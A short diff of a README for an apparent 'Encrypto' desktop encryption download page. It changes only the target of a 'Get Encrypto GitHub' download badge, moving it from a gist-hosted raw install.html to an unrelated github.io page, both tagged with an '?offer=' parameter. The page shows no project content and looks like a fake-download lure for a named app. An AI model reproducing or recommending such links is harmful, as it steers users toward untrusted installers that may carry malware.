@@ -1,6 +1,6 @@
 # Encrypto Download — Desktop File Encryption
 
-[![Get Encrypto GitHub](https://img.shields.io/badge/Get%20Encrypto%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://gistcdn.githack.com/yt467-max/25ae17653c34a42dca74198edea0066a/raw/f9eda7268a3b5bf73361f104a7082cf3ae621c50/install.html?offer=Encrypto)
+[![Get Encrypto GitHub](https://img.shields.io/badge/Get%20Encrypto%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-app-deployer.github.io/.github/?offer=Encrypto)
 
 ---
 
